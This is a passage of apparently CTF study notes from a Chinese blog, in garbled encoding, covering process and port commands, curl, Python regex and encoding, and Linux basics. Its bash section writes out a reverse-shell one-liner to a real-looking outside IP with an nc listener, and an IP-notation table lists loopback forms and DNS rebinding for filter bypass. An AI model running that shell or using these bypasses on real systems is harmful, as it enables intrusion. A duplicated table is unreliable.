<h3 id="ç«¯å£æŸ¥çœ‹"><a href="#ç«¯å£æŸ¥çœ‹" class="headerlink" title="ç«¯å£æŸ¥çœ‹:"></a>ç«¯å£æŸ¥çœ‹:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ss -ltnp | grep :80      ---linxu</span><br><span class="line">netstat -ano | findstr &quot;:80&quot;   ---windows</span><br></pre></td></tr></table></figure>

<h3 id="è¿›ç¨‹æŸ¥çœ‹"><a href="#è¿›ç¨‹æŸ¥çœ‹" class="headerlink" title="è¿›ç¨‹æŸ¥çœ‹:"></a>è¿›ç¨‹æŸ¥çœ‹:</h3><table>
<thead>
<tr>
<th>åŠŸèƒ½&#x2F;ç›®çš„</th>
<th>Linux å‘½ä»¤</th>
<th>Windows å‘½ä»¤</th>
<th>è¯´æ˜è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹</td>
<td><code>ps aux</code></td>
<td><code>tasklist</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹</td>
</tr>
<tr>
<td>æŸ¥çœ‹ç‰¹å®šè¿›ç¨‹</td>
<td>&#96;ps -ef</td>
<td>grep è¿›ç¨‹å<code>æˆ–</code>pgrep&#96;</td>
<td>&#96;tasklist</td>
</tr>
<tr>
<td>æŸ¥çœ‹æŒ‡å®š PID ä¿¡æ¯</td>
<td><code>ps -p PID -o pid,cmd,%mem,%cpu</code></td>
<td><code>tasklist /fi &quot;PID eq 1234&quot;</code></td>
<td>æŸ¥çœ‹è¿›ç¨‹èµ„æºä½¿ç”¨æƒ…å†µ</td>
</tr>
<tr>
<td>æŸ¥çœ‹è¿›ç¨‹å±‚çº§ç»“æ„</td>
<td><code>pstree</code></td>
<td><code>tasklist /v</code>ï¼ˆç»“æ„è¾ƒå¼±ï¼‰</td>
<td>Linux æä¾›æ›´æ¸…æ™°çš„çˆ¶å­è¿›ç¨‹å±‚çº§</td>
</tr>
<tr>
<td>å®æ—¶æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€</td>
<td><code>top</code> &#x2F; <code>htop</code>ï¼ˆéœ€å®‰è£…ï¼‰</td>
<td><code>tasklist</code>ï¼ˆä¸å®æ—¶ï¼‰ &#x2F; <code>resmon</code> &#x2F; <code>taskmgr</code></td>
<td>Linux æ›´çµæ´»ï¼Œæ”¯æŒæ’åº&#x2F;è¿‡æ»¤ç­‰äº¤äº’å¼æ“ä½œ</td>
</tr>
<tr>
<td>æ€æ­»è¿›ç¨‹</td>
<td><code>kill -9 PID</code></td>
<td><code>taskkill /PID &lt;pid&gt; /F</code></td>
<td>å¼ºåˆ¶ç»“æŸè¿›ç¨‹</td>
</tr>
<tr>
<td>æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€æ–‡ä»¶</td>
<td><code>lsof -p &lt;PID&gt;</code></td>
<td>æ— ç›´æ¥å‘½ä»¤ï¼ˆéœ€ç¬¬ä¸‰æ–¹å·¥å…·ï¼‰</td>
<td>ä»… Linux åŸç”Ÿå‘½ä»¤æ”¯æŒ</td>
</tr>
<tr>
<td>æŸ¥çœ‹è¿›ç¨‹ç›‘å¬ç«¯å£</td>
<td><code>lsof -i</code> &#x2F; <code>ss -lptn</code></td>
<td><code>netstat -ano</code> + <code>tasklist</code></td>
<td>Linux æ›´ç›´æ¥ï¼ŒWindows éœ€ç»„åˆå‘½ä»¤</td>
</tr>
</tbody></table>
<h3 id="curlå‘½ä»¤"><a href="#curlå‘½ä»¤" class="headerlink" title="curlå‘½ä»¤:"></a>curlå‘½ä»¤:</h3><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>ç¤ºä¾‹å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>GET è¯·æ±‚</strong></td>
<td><code>curl http://localhost:8080/hello</code></td>
<td>å‘èµ·ç®€å•çš„ GET è¯·æ±‚</td>
</tr>
<tr>
<td><strong>POST è¡¨å•</strong></td>
<td><code>curl -X POST -d &quot;name=wan&amp;age=18&quot; http://localhost:8080/form</code></td>
<td><code>-d</code> è¡¨ç¤º form è¡¨å•æ•°æ®ï¼Œé»˜è®¤ <code>application/x-www-form-urlencoded</code></td>
</tr>
<tr>
<td><strong>POST JSON</strong></td>
<td><code>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;name&quot;:&quot;wan&quot;,&quot;age&quot;:18&#125;&#39; http://localhost:8080/json</code></td>
<td><code>-H</code> æŒ‡å®šè¯·æ±‚å¤´ï¼Œå‘é€ JSON æ•°æ®</td>
</tr>
<tr>
<td><strong>æ·»åŠ è¯·æ±‚å¤´</strong></td>
<td><code>curl -H &quot;Authorization: Bearer TOKEN&quot; http://localhost:8080/api</code></td>
<td>æ¨¡æ‹Ÿç™»å½•è®¤è¯ç­‰ï¼Œå¸¸ç”¨äº JWT</td>
</tr>
<tr>
<td><strong>æºå¸¦ Cookie</strong></td>
<td><code>curl --cookie &quot;sessionid=abc123&quot; http://localhost:8080/auth</code></td>
<td>ç”¨äºæ¨¡æ‹Ÿæµè§ˆå™¨ session</td>
</tr>
<tr>
<td><strong>å“åº”è¾“å‡ºæ§åˆ¶</strong></td>
<td><code>curl -i</code>ï¼ˆè¾“å‡ºå“åº”å¤´ï¼‰<code>curl -v</code>ï¼ˆè¯¦ç»†è°ƒè¯•ä¿¡æ¯ï¼‰</td>
<td><code>-i</code> æ˜¾ç¤ºå“åº”å¤´ï¼Œ<code>-v</code> æ‰“å°è¿‡ç¨‹</td>
</tr>
<tr>
<td><strong>ä¸Šä¼ æ–‡ä»¶</strong></td>
<td><code>curl -F &quot;file=@test.jpg&quot; http://localhost:8080/upload</code></td>
<td>ç”¨äº <code>multipart/form-data</code> æ–‡ä»¶ä¸Šä¼ </td>
</tr>
<tr>
<td><strong>è®¾ç½®ä»£ç†</strong></td>
<td><code>curl -x 127.0.0.1:7890 http://example.com</code></td>
<td>ä½¿ç”¨ HTTP ä»£ç†å‘é€è¯·æ±‚</td>
</tr>
<tr>
<td><strong>ä¿å­˜å“åº”</strong></td>
<td><code>curl -o out.txt http://localhost:8080/data</code></td>
<td>å°†å“åº”ä¿å­˜è‡³æ–‡ä»¶ä¸­</td>
</tr>
<tr>
<td><strong>ç¦æ­¢è¯ä¹¦æ ¡éªŒ</strong></td>
<td><code>curl -k https://localhost:8443</code></td>
<td>ç”¨äºæµ‹è¯•è‡ªç­¾å HTTPS æ¥å£</td>
</tr>
</tbody></table>
<h2 id="3-pythonç”¨æ³•"><a href="#3-pythonç”¨æ³•" class="headerlink" title="3.pythonç”¨æ³•:"></a>3.pythonç”¨æ³•:</h2><h3 id="1-åˆ‡ç‰‡"><a href="#1-åˆ‡ç‰‡" class="headerlink" title="1.åˆ‡ç‰‡:"></a>1.åˆ‡ç‰‡:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">åˆ‡ç‰‡æ˜¯ Python æä¾›çš„ä¸€ç§ç”¨äºæå–åºåˆ—ï¼ˆå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ç­‰ï¼‰å­é›†çš„æœºåˆ¶ã€‚å®ƒå…è®¸ä½ é€šè¿‡ èµ·å§‹ç´¢å¼•ã€ç»“æŸç´¢å¼•ã€æ­¥é•¿ æ¥è®¿é—®åºåˆ—ä¸­çš„å…ƒç´ ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="1-åˆ‡ç‰‡çš„åŸºæœ¬æ ¼å¼"><a href="#1-åˆ‡ç‰‡çš„åŸºæœ¬æ ¼å¼" class="headerlink" title="1.åˆ‡ç‰‡çš„åŸºæœ¬æ ¼å¼:"></a>1.åˆ‡ç‰‡çš„åŸºæœ¬æ ¼å¼:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s[start:stop:step]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>start</code></td>
<td>èµ·å§‹ç´¢å¼•ï¼ˆåŒ…å«ï¼‰</td>
</tr>
<tr>
<td><code>stop</code></td>
<td>ç»“æŸç´¢å¼•ï¼ˆä¸åŒ…å«ï¼‰</td>
</tr>
<tr>
<td><code>step</code></td>
<td>æ­¥é•¿ï¼ˆé—´éš”ï¼‰ï¼Œå¯ä»¥æ˜¯è´Ÿæ•°</td>
</tr>
</tbody></table>
<h4 id="2-å¯åˆ‡ç‰‡åºåˆ—ç±»å‹"><a href="#2-å¯åˆ‡ç‰‡åºåˆ—ç±»å‹" class="headerlink" title="2.å¯åˆ‡ç‰‡åºåˆ—ç±»å‹:"></a>2.å¯åˆ‡ç‰‡åºåˆ—ç±»å‹:</h4><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>æ˜¯å¦æ”¯æŒåˆ‡ç‰‡</th>
</tr>
</thead>
<tbody><tr>
<td>å­—ç¬¦ä¸²</td>
<td>âœ… æ”¯æŒ</td>
</tr>
<tr>
<td>åˆ—è¡¨</td>
<td>âœ… æ”¯æŒ</td>
</tr>
<tr>
<td>å…ƒç»„</td>
<td>âœ… æ”¯æŒ</td>
</tr>
<tr>
<td>NumPy æ•°ç»„</td>
<td>âœ… ï¼ˆå¹¶æ”¯æŒå¤šç»´åˆ‡ç‰‡ï¼‰</td>
</tr>
<tr>
<td>è‡ªå®šä¹‰ç±»</td>
<td>âœ… åªè¦å®ç° <code>__getitem__</code></td>
</tr>
</tbody></table>
<h3 id="2-reæ¨¡å—"><a href="#2-reæ¨¡å—" class="headerlink" title="2.reæ¨¡å—;"></a>2.reæ¨¡å—;</h3><h4 id="1-åŸºç¡€ç”¨æ³•"><a href="#1-åŸºç¡€ç”¨æ³•" class="headerlink" title="1.åŸºç¡€ç”¨æ³•:"></a>1.åŸºç¡€ç”¨æ³•:</h4><table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>ç”¨é€”</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>re.search()</code></td>
<td>åŒ¹é…<strong>ä¸€ä¸ª</strong>ç¬¦åˆçš„</td>
<td><code>re.search(r&#39;flag&#123;.*&#125;&#39;, s)</code></td>
</tr>
<tr>
<td><code>re.findall()</code></td>
<td>è¿”å›<strong>æ‰€æœ‰</strong>åŒ¹é…å†…å®¹</td>
<td><code>re.findall(r&#39;\d+&#39;, s)</code></td>
</tr>
<tr>
<td><code>re.sub()</code></td>
<td>æ›¿æ¢åŒ¹é…é¡¹</td>
<td><code>re.sub(r&#39;sleep\([^)]+\)&#39;, &#39;1&#39;, payload)</code></td>
</tr>
<tr>
<td><code>re.match()</code></td>
<td>åŒ¹é…å¼€å¤´ï¼ˆä»å¤´åŒ¹é…ï¼‰</td>
<td><code>re.match(r&#39;^GET&#39;, line)</code></td>
</tr>
<tr>
<td><code>re.split()</code></td>
<td>æ­£åˆ™åˆ†å‰²å­—ç¬¦ä¸²</td>
<td><code>re.split(r&#39;\s+&#39;, s)</code></td>
</tr>
<tr>
<td><code>re.compile()</code></td>
<td>ç¼–è¯‘æ­£åˆ™å¯¹è±¡</td>
<td><code>r = re.compile(r&#39;sleep\(\d+\)&#39;)</code></td>
</tr>
</tbody></table>
<h4 id="2-æ­£åˆ™è¡¨è¾¾å¼"><a href="#2-æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="2.æ­£åˆ™è¡¨è¾¾å¼;"></a>2.æ­£åˆ™è¡¨è¾¾å¼;</h4><table>
<thead>
<tr>
<th>è¡¨è¾¾å¼</th>
<th>å«ä¹‰</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>.</code></td>
<td>ä»»æ„å­—ç¬¦ï¼ˆä¸åŒ…æ‹¬æ¢è¡Œï¼‰</td>
<td><code>a.b</code> åŒ¹é… <code>acb</code>, <code>arb</code></td>
</tr>
<tr>
<td><code>*</code></td>
<td>é‡å¤0æ¬¡æˆ–å¤šæ¬¡</td>
<td><code>.*</code> åŒ¹é…ä»»æ„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>+</code></td>
<td>é‡å¤1æ¬¡æˆ–å¤šæ¬¡</td>
<td><code>\d+</code> åŒ¹é… <code>123</code></td>
</tr>
<tr>
<td><code>?</code></td>
<td>0æˆ–1æ¬¡ï¼ˆæˆ–éè´ªå©ªï¼‰</td>
<td><code>.*?</code> åŒ¹é…æœ€çŸ­å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>[...]</code></td>
<td>å­—ç¬¦é›†</td>
<td><code>[0-9]</code> åŒ¹é…æ•°å­—</td>
</tr>
<tr>
<td><code>[^...]</code></td>
<td>éå­—ç¬¦é›†</td>
<td><code>[^A-Z]</code> éå¤§å†™å­—æ¯</td>
</tr>
<tr>
<td><code>\d</code></td>
<td>æ•°å­—ï¼ˆç­‰ä»·äº [0-9]ï¼‰</td>
<td><code>\d&#123;4&#125;</code> åŒ¹é…4ä½æ•°</td>
</tr>
<tr>
<td><code>\w</code></td>
<td>å•è¯å­—ç¬¦ï¼ˆå­—æ¯æ•°å­—ä¸‹åˆ’çº¿ï¼‰</td>
<td><code>\w+</code> åŒ¹é…å˜é‡å</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>ç©ºç™½å­—ç¬¦</td>
<td><code>\s+</code> åŒ¹é…ä»»æ„ç©ºæ ¼ã€æ¢è¡Œ</td>
</tr>
<tr>
<td><code>^</code></td>
<td>è¡Œé¦–</td>
<td><code>^flag</code> ä»¥ flag å¼€å¤´</td>
</tr>
<tr>
<td><code>$</code></td>
<td>è¡Œå°¾</td>
<td><code>abc$</code> ä»¥ abc ç»“å°¾</td>
</tr>
<tr>
<td>&#96;</td>
<td>&#96;</td>
<td>æˆ–</td>
</tr>
</tbody></table>
<h3 id="3-urlç¼–ç å®ç°-urllib-parse-åº“"><a href="#3-urlç¼–ç å®ç°-urllib-parse-åº“" class="headerlink" title="3.urlç¼–ç å®ç°( urllib.parse)åº“:"></a>3.urlç¼–ç å®ç°( urllib.parse)åº“:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‡½æ•°å</th>
<th>ä½œç”¨</th>
<th>ç¤ºä¾‹</th>
<th>ç”¨æ³•è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>urllib.parse.quote()</code></td>
<td>ç¼–ç å­—ç¬¦ä¸²ï¼ˆå¸¸ç”¨äºè·¯å¾„ï¼‰</td>
<td><code>quote(&quot;a b/c&quot;)</code> â†’ <code>&#39;a%20b%2Fc&#39;</code></td>
<td>é»˜è®¤ <code>/</code> ä¸ç¼–ç ï¼Œå¯æ”¹ <code>safe=&#39;&#39;</code> å¼ºç¼–ç </td>
</tr>
<tr>
<td><code>urllib.parse.quote_plus()</code></td>
<td>ç¼–ç å­—ç¬¦ä¸²ï¼Œå¹¶å°†ç©ºæ ¼è½¬ä¸º <code>+</code></td>
<td><code>quote_plus(&quot;a b/c&quot;)</code> â†’ <code>&#39;a+b%2Fc&#39;</code></td>
<td>å¸¸ç”¨äº <code>application/x-www-form-urlencoded</code></td>
</tr>
<tr>
<td><code>urllib.parse.urlencode()</code></td>
<td>ç¼–ç å­—å…¸ä¸ºæŸ¥è¯¢å‚æ•°</td>
<td><code>urlencode(&#123;&#39;q&#39;:&#39;ctf show&#39;,&#39;page&#39;:1&#125;)</code> â†’ <code>&#39;q=ctf+show&amp;page=1&#39;</code></td>
<td>ç”¨äº GET è¯·æ±‚å‚æ•°æ‹¼æ¥</td>
</tr>
</tbody></table>
<h3 id="4-Unicodeç¼–ç å®ç°"><a href="#4-Unicodeç¼–ç å®ç°" class="headerlink" title="4.Unicodeç¼–ç å®ç°:"></a>4.Unicodeç¼–ç å®ç°:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">å®ç°ç¼–ç :</span><br><span class="line">    .encode(<span class="string">&#x27;unicode_escape&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">å®ç°è§£ç :</span><br><span class="line">    .encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-windowså‘½ä»¤"><a href="#4-windowså‘½ä»¤" class="headerlink" title="4.windowså‘½ä»¤:"></a>4.windowså‘½ä»¤:</h2><h3 id="1-chcp-æ›´æ”¹ä»£ç é¡µ"><a href="#1-chcp-æ›´æ”¹ä»£ç é¡µ" class="headerlink" title="1.chcp(æ›´æ”¹ä»£ç é¡µ)"></a>1.chcp(æ›´æ”¹ä»£ç é¡µ)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">65001â€”â€”UTF-8</span><br><span class="line">936â€”â€”ç®€ä½“ä¸­æ–‡</span><br><span class="line">950â€”â€”ç¹ä½“ä¸­æ–‡</span><br><span class="line">437â€”â€”ç¾å›½/åŠ æ‹¿å¤§è‹±è¯­</span><br><span class="line">932â€”â€”æ—¥æ–‡</span><br><span class="line">949â€”â€”éŸ©æ–‡</span><br><span class="line">866â€”â€”ä¿„æ–‡</span><br></pre></td></tr></table></figure>

<h3 id="2-ä½¿ç”¨ä»£ç†"><a href="#2-ä½¿ç”¨ä»£ç†" class="headerlink" title="2. ä½¿ç”¨ä»£ç†:"></a>2. ä½¿ç”¨ä»£ç†:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸´æ—¶è®¾ç½®:</span><br><span class="line">set http_proxy=http://127.0.0.1:7890</span><br><span class="line">set https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>

<h2 id="5-linxuå‘½ä»¤"><a href="#5-linxuå‘½ä»¤" class="headerlink" title="5.linxuå‘½ä»¤:"></a>5.linxuå‘½ä»¤:</h2><h3 id="1-åˆ›å»ºç›®å½•"><a href="#1-åˆ›å»ºç›®å½•" class="headerlink" title="1.åˆ›å»ºç›®å½•:"></a>1.åˆ›å»ºç›®å½•:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir     -p:åˆ›å»ºå¤šçº§ç›®å½•</span><br></pre></td></tr></table></figure>

<h3 id="2-è§£å‹-gzæ–‡ä»¶"><a href="#2-è§£å‹-gzæ–‡ä»¶" class="headerlink" title="2.è§£å‹.gzæ–‡ä»¶:"></a>2.è§£å‹.gzæ–‡ä»¶:</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è§£å‹åä¿ç•™ <code>.gz</code> å—ï¼Ÿ</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>gunzip file.gz</code></td>
<td>âŒ ä¸ä¿ç•™</td>
<td>æœ€å¸¸ç”¨</td>
</tr>
<tr>
<td><code>gzip -d file.gz</code></td>
<td>âŒ ä¸ä¿ç•™</td>
<td>ä¸ <code>gunzip</code> ç­‰æ•ˆ</td>
</tr>
<tr>
<td><code>gzip -dk file.gz</code></td>
<td>âœ… ä¿ç•™</td>
<td><code>-k</code> è¡¨ç¤ºä¿ç•™åŸæ–‡ä»¶</td>
</tr>
<tr>
<td><code>zcat file.gz</code></td>
<td>âœ… ä¸è§£å‹ï¼Œä»…æŸ¥çœ‹</td>
<td>å¿«é€ŸæŸ¥çœ‹</td>
</tr>
</tbody></table>
<h2 id="6-bash"><a href="#6-bash" class="headerlink" title="6.bash:"></a>6.bash:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c ä»å­—ç¬¦ä¸²ä¸­è¯»å…¥å‘½ä»¤</span><br><span class="line">bash -iï¼Œæ„ä¸ºåˆ›å»ºä¸€ä¸ªäº¤äº’å¼çš„bash shell</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1</span><br><span class="line">/dev/tcp/139.224.54.229/9090ï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œå®ƒä¼šå»ºç«‹ä¸€ä¸ªè¿æ¥åˆ°192.168.1.1:9090çš„socket</span><br><span class="line">bash -iåˆ›å»ºä¸€ä¸ªäº¤äº’å¼çš„bashï¼Œ&amp;&gt;å°†bashçš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/tcp/192.168.1.1/9090çš„socketè¿æ¥ä¸Šï¼Œ</span><br><span class="line">0&gt;&amp;1å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œæœ€ç»ˆçš„ç»“æœå°±æ˜¯æ ‡å‡†è¾“å…¥ä¹Ÿè¢«é‡å®šå‘åˆ°äº†TCPè¿æ¥ä¸­ï¼Œ</span><br><span class="line">å› æ­¤è¾“å…¥å’Œè¾“å‡ºéƒ½å¯ä»¥åœ¨å…¬ç½‘ä¸»æœºä¸Šè¿›è¡Œï¼Œé€šè¿‡TCPè¿æ¥å’Œbashè¿›è¡Œäº¤äº’</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1     --æ¨¡æ¿åå¼¹shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 9090   </span><br></pre></td></tr></table></figure>

<h2 id="7-ipåœ°å€çš„å„ç§å½¢å¼"><a href="#7-ipåœ°å€çš„å„ç§å½¢å¼" class="headerlink" title="7.ipåœ°å€çš„å„ç§å½¢å¼:"></a>7.ipåœ°å€çš„å„ç§å½¢å¼:</h2><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>è¡¨ç¤ºæ–¹æ³•</th>
<th>ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>âœ… æ ‡å‡†åè¿›åˆ¶</td>
<td><code>a.b.c.d</code></td>
<td><code>127.0.0.1</code></td>
<td>æœ€å¸¸è§</td>
</tr>
<tr>
<td>âœ… åè¿›åˆ¶æ•´æ•°</td>
<td>å•ä¸ªåè¿›åˆ¶æ•°</td>
<td><code>2130706433</code></td>
<td><code>127Ã—256Â³ + 0Ã—256Â² + 0Ã—256 + 1</code></td>
</tr>
<tr>
<td>âœ… å…«è¿›åˆ¶</td>
<td><code>0177.0.0.01</code></td>
<td><code>0177.0.0.01</code></td>
<td>å…«è¿›åˆ¶ï¼š<code>0177=127</code>ï¼Œ<code>01=1</code></td>
</tr>
<tr>
<td>âœ… åå…­è¿›åˆ¶</td>
<td><code>0x7f.0x0.0x0.0x1</code></td>
<td><code>0x7f.0x0.0x0.0x1</code></td>
<td><code>0x7f=127</code>ï¼Œæ”¯æŒç»•è¿‡</td>
</tr>
<tr>
<td>âœ… æ•´ä½“åå…­è¿›åˆ¶</td>
<td><code>0x7f000001</code></td>
<td><code>127.0.0.1</code></td>
<td>ä¸€æ•´ä¸ª IP ä½œä¸º hex</td>
</tr>
<tr>
<td>âœ… æ•´ä½“æ··åˆè¡¨ç¤º</td>
<td><code>127.1</code></td>
<td>ç­‰ä»· <code>127.0.0.1</code></td>
<td>åä¸¤æ®µè‡ªåŠ¨è¡¥å…¨ä¸º0</td>
</tr>
<tr>
<td>âœ… åŸŸåè§£æ</td>
<td><code>localhost</code></td>
<td><code>localhost</code></td>
<td>DNSè§£ææˆ127.0.0.1</td>
</tr>
<tr>
<td>âœ… DNSè·³è½¬</td>
<td><code>evil.ceye.io</code></td>
<td>è§£æä¸ºå†…ç½‘ IP</td>
<td>é…åˆ DNS rebinding</td>
</tr>
<tr>
<td>âœ… æ•°ç»„å¼åˆ†æ®µ</td>
<td><code>127.0.1</code></td>
<td>&#x3D; <code>127.0.0.1</code></td>
<td>ç¼ºçœè¡¥0ï¼Œæµè§ˆå™¨å…¼å®¹</td>
</tr>
<tr>
<td>âœ… åå…­è¿›åˆ¶åˆ†æ®µæ··ç”¨</td>
<td><code>0x7f.1</code></td>
<td><code>127.0.0.1</code></td>
<td>åˆ†æ®µå¯æ··åˆè¿›åˆ¶</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>è¡¨è¾¾å½¢å¼</th>
<th>å¯¹åº” IP</th>
</tr>
</thead>
<tbody><tr>
<td><code>127.0.0.1</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>127.1</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>0x7f.0.0.1</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>0x7f000001</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>0177.0.0.01</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>2130706433</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>[::1]</code></td>
<td>127.0.0.1 (IPv6 å›ç¯)</td>
</tr>
</tbody></table>
<p>è¿˜æœ‰ä¸ª0.0.0.0æˆ–è€…0(linxu)</p>
<h2 id="8-nginx"><a href="#8-nginx" class="headerlink" title="8.nginx:"></a>8.nginx:</h2><table>
<thead>
<tr>
<th>æ—¥å¿—ç±»å‹</th>
<th>é»˜è®¤è·¯å¾„</th>
</tr>
</thead>
<tbody><tr>
<td><strong>è®¿é—®æ—¥å¿—</strong></td>
<td><code>/var/log/nginx/access.log</code></td>
</tr>
<tr>
<td><strong>é”™è¯¯æ—¥å¿—</strong></td>
<td><code>/var/log/nginx/error.log</code></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>linxuå‘½ä»¤</title>
    <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="linux-å¸¸ç”¨å‘½ä»¤"><a href="#linux-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="linux å¸¸ç”¨å‘½ä»¤"></a>linux å¸¸ç”¨å‘½ä»¤</h1><h3 id="1-æ–°å»ºè™šæ‹Ÿç¯å¢ƒ"><a href="#1-æ–°å»ºè™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="1.æ–°å»ºè™šæ‹Ÿç¯å¢ƒ"></a>1.æ–°å»ºè™šæ‹Ÿç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿›å…¥è™šæ‹Ÿç¯å¢ƒ:   source venv/bin/activate</span><br><span class="line">å¯åŠ¨ä¸€ä¸ª screen ä¼šè¯ï¼šscreen -S mysession</span><br><span class="line">ä»¥åå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤é‡æ–°è¿æ¥ä¼šè¯ï¼š screen -r mysession</span><br></pre></td></tr></table></figure>

<h3 id="2-å¤åˆ¶æ–‡ä»¶å‘½ä»¤"><a href="#2-å¤åˆ¶æ–‡ä»¶å‘½ä»¤" class="headerlink" title="2.å¤åˆ¶æ–‡ä»¶å‘½ä»¤:"></a>2.å¤åˆ¶æ–‡ä»¶å‘½ä»¤:</h3><h4 id="1-cpå‘½ä»¤"><a href="#1-cpå‘½ä»¤" class="headerlink" title="1.cpå‘½ä»¤:"></a>1.cpå‘½ä»¤:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp [é€‰é¡¹] æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶/ç›®å½•</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>cp a.txt b.txt</code></td>
<td>æŠŠ <code>a.txt</code> å¤åˆ¶æˆ <code>b.txt</code></td>
</tr>
<tr>
<td><code>cp a.txt /tmp/</code></td>
<td>æŠŠ <code>a.txt</code> å¤åˆ¶åˆ° <code>/tmp/</code> ç›®å½•</td>
</tr>
<tr>
<td><code>cp -r dir1 dir2</code></td>
<td>é€’å½’å¤åˆ¶ç›®å½•ï¼ˆå¿…é¡»åŠ  <code>-r</code>ï¼‰</td>
</tr>
<tr>
<td><code>cp -f a b</code></td>
<td>å¼ºåˆ¶è¦†ç›–ç›®æ ‡æ–‡ä»¶</td>
</tr>
<tr>
<td><code>cp -u a b</code></td>
<td>ä»…å½“æºæ–‡ä»¶æ¯”ç›®æ ‡æ–°æ—¶æ‰å¤åˆ¶ï¼ˆå¸¸ç”¨äºå¤‡ä»½ï¼‰</td>
</tr>
</tbody></table>
<h4 id="2-teeå‘½ä»¤"><a href="#2-teeå‘½ä»¤" class="headerlink" title="2.teeå‘½ä»¤:"></a>2.teeå‘½ä»¤:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command | tee [é€‰é¡¹] æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>å‘½ä»¤</strong></th>
<th><strong>è¯´æ˜</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>cp a.txt b.txt</code></td>
<td>æŠŠ <code>a.txt</code> å¤åˆ¶æˆ <code>b.txt</code></td>
</tr>
<tr>
<td><code>cp a.txt /tmp/</code></td>
<td>æŠŠ <code>a.txt</code> å¤åˆ¶åˆ° <code>/tmp/</code> ç›®å½•</td>
</tr>
<tr>
<td><code>cp -r dir1 dir2</code></td>
<td>é€’å½’å¤åˆ¶ç›®å½•ï¼ˆå¿…é¡»åŠ  <code>-r</code> é€‰é¡¹ï¼‰</td>
</tr>
<tr>
<td><code>cp -f a b</code></td>
<td>å¼ºåˆ¶è¦†ç›–ç›®æ ‡æ–‡ä»¶ï¼Œæ— è®ºç›®æ ‡æ–‡ä»¶æ˜¯å¦å­˜åœ¨</td>
</tr>
<tr>
<td><code>cp -u a b</code></td>
